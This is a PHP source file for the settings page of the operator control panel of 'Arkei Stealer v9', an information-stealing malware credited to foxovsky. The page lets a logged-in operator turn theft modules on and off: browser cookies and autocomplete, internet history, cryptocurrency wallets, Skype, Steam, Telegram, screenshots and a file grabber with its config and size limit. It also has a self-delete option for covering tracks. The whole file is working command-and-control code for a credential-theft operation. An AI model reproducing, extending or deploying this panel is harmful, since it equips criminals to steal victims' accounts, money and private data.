<?php
/*
* -------------------------------------------------------------
*								_        _ 
*					 /\        | |      (_)
*					/  \   _ __| | _____ _ 
*				   / /\ \ | '__| |/ / _ \ |
*				  / ____ \| |  |   <  __/ |
*				 /_/    \_\_|  |_|\_\___|_|
*
*
*                    Arkei Stealer v9
*                   (x) foxovsky 2018
*
* -------------------------------------------------------------
* [settings.php]
*    Settings
*/

session_start();

require("../app/config.php");

if($_SESSION["auth"] != true)
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/auth.php', true, 301 );
	exit(0);
}

$userProfile = $_SESSION["profile"];

if($userProfile != "0")
{
	header( 'Location: http://'. $config["panel_url"] .'/'. $config["panel_folder"] .'/dashboard.php', true, 301 );
	exit(0);
}

$pageName = "Settings";

$repeated_reports			= checkParam($_POST["repeated_reports"]);
$self_delete				= checkParam($_POST["self_delete"]);
$cookies_autocomplete 		= checkParam($_POST["cookies_autocomplete"]);
$history 					= checkParam($_POST["history"]);
$cryptocurrency 			= checkParam($_POST["cryptocurrency"]);
$skype 						= checkParam($_POST["skype"]);
$steam 						= checkParam($_POST["steam"]);
$telegram					= checkParam($_POST["telegram"]);
$screenshot 				= checkParam($_POST["screenshot"]);
$grabber 					= checkParam($_POST["grabber"]);
$grub_config 				= checkParam($_POST["grub_config"]);
$max_size 					= checkParam($_POST["max_size"]);

$database = mysqli_connect($config["db_server"], $config["db_user"], $config["db_password"], $config["db_name"]);

if($database)
{
	$repeated_reports 		= mysqli_real_escape_string($database, $repeated_reports);
	$self_delete 			= mysqli_real_escape_string($database, $self_delete);
	$cookies_autocomplete	= mysqli_real_escape_string($database, $cookies_autocomplete);
	$history 				= mysqli_real_escape_string($database, $history);
	$cryptocurrency 		= mysqli_real_escape_string($database, $cryptocurrency);
	$skype 					= mysqli_real_escape_string($database, $skype);
	$steam 					= mysqli_real_escape_string($database, $steam);
	$telegram 				= mysqli_real_escape_string($database, $telegram);
	$screenshot				= mysqli_real_escape_string($database, $screenshot);
	$grabber 				= mysqli_real_escape_string($database, $grabber);
	$grub_config 			= mysqli_real_escape_string($database, $grub_config);
	$max_size 				= mysqli_real_escape_string($database, $max_size);
	
	if($repeated_reports != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$repeated_reports' WHERE `Name`='repeated_reports';");
	}
	
	if($self_delete != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$self_delete' WHERE `Name`='self_delete';");
	}
	
	if($cookies_autocomplete != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$cookies_autocomplete' WHERE `Name`='cookies_autocomplete';");
	}
	
	if($history != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$history' WHERE `Name`='history';");
	}
	
	if($cryptocurrency != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$cryptocurrency' WHERE `Name`='cryptocurrency';");
	}
	
	if($skype != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$skype' WHERE `Name`='skype';");
	}
	
	if($steam != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$steam' WHERE `Name`='steam';");
	}
	
	if($telegram != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$telegram' WHERE `Name`='telegram';");
	}
	
	if($screenshot != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$screenshot' WHERE `Name`='screenshot';");
	}
	
	if($grabber != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$grabber' WHERE `Name`='grabber';");
	}
	
	if($grub_config != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$grub_config' WHERE `Name`='grub_files';");
	}
	
	if($max_size != null)
	{
		$database->query("UPDATE `settings` SET `Value`='$max_size' WHERE `Name`='max_size';");
	}
	
	$_repeated_reports		= $database->query("SELECT * FROM `settings` WHERE `Name`='repeated_reports';")->fetch_array();
	$_self_delete			= $database->query("SELECT * FROM `settings` WHERE `Name`='self_delete';")->fetch_array();
	$_cookies_autocomplete 	= $database->query("SELECT * FROM `settings` WHERE `Name`='cookies_autocomplete';")->fetch_array();
	$_history 				= $database->query("SELECT * FROM `settings` WHERE `Name`='history';")->fetch_array();
	$_cryptocurrency 		= $database->query("SELECT * FROM `settings` WHERE `Name`='cryptocurrency';")->fetch_array();
	$_skype 				= $database->query("SELECT * FROM `settings` WHERE `Name`='skype';")->fetch_array();
	$_steam 				= $database->query("SELECT * FROM `settings` WHERE `Name`='steam';")->fetch_array();
	$_telegram 				= $database->query("SELECT * FROM `settings` WHERE `Name`='telegram';")->fetch_array();
	$_screenshot 			= $database->query("SELECT * FROM `settings` WHERE `Name`='screenshot';")->fetch_array();
	$_grabber 				= $database->query("SELECT * FROM `settings` WHERE `Name`='grabber';")->fetch_array();
	$_grub_config 			= $database->query("SELECT * FROM `settings` WHERE `Name`='grub_files';")->fetch_array();
	$_max_size 				= $database->query("SELECT * FROM `settings` WHERE `Name`='max_size';")->fetch_array();
}

require("template/header.tmpl.php");

function checkParam($param)
{
	$formatted = $param;
	$formatted = trim($formatted);
	$formatted = stripslashes($formatted);
	$formatted = htmlspecialchars($formatted);
	
	return $formatted;
}

?>
<div class="wrapper">
            <div class="container-fluid">
                <div class="row">
                    <div class="col-12">
                        <div class="page-title-box">
                            <h4 class="page-title">Settings</h4>
                        </div>
                    </div>
                </div>     
                <div class="row">
                    <div class="col-12">
                        <div class="card">
                            <div class="card-body">
                                <h4 class="header-title"></h4>
    
                                <form class="form-horizontal" action="" method="POST">
								
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Repeated Reports</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="repeated_reports">
                                                <option <? if($_repeated_reports["Value"] == "1") { echo "selected"; } ?>  value="1">ON</option>
                                                <option <? if($_repeated_reports["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Self-delete</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="self_delete">
                                                <option <? if($_self_delete["Value"] == "1") { echo "selected"; } ?>  value="1">ON</option>
                                                <option <? if($_self_delete["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Cookies / Autocomplete</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="cookies_autocomplete">
                                                <option <? if($_cookies_autocomplete["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_cookies_autocomplete["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Internet History</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="history">
                                                <option <? if($_history["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_history["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Cryptocurrency Wallets</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="cryptocurrency">
                                                <option <? if($_cryptocurrency["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_cryptocurrency["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Skype History</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="skype">
                                                <option <? if($_skype["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_skype["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Steam</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="steam">
                                                <option <? if($_steam["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_steam["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Telegram</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="telegram">
                                                <option <? if($_telegram["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_telegram["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Screenshot</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="screenshot">
                                                <option <? if($_screenshot["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_screenshot["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Files Grabber</label>
                                        <div class="col-sm-10">
                                            <select class="form-control" name="grabber">
                                                <option <? if($_grabber["Value"] == "1") { echo "selected"; } ?> value="1">ON</option>
                                                <option <? if($_grabber["Value"] == "2") { echo "selected"; } ?> value="2">OFF</option>
                                            </select>
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Grabber Config</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" value="<? echo $_grub_config["Value"]; ?>" name="grub_config" type="text">
                                        </div>
                                    </div>
									
									<div class="form-group row">
                                        <label class="col-sm-2 col-form-label">Grabber Max Size (kB)</label>
                                        <div class="col-sm-10">
                                            <input class="form-control" value="<? echo $_max_size["Value"]; ?>" name="max_size" type="text">
                                        </div>
                                    </div>
									
									<button type="submit" class="btn btn-primary">Save</button>
    
                                </form>
    
                            </div> <!-- end card-box -->
                        </div> <!-- end card-->
                    </div><!-- end col -->
                </div> 
            </div> <!-- end container -->
        </div>
<?php
require("template/footer.tmpl.php");
?>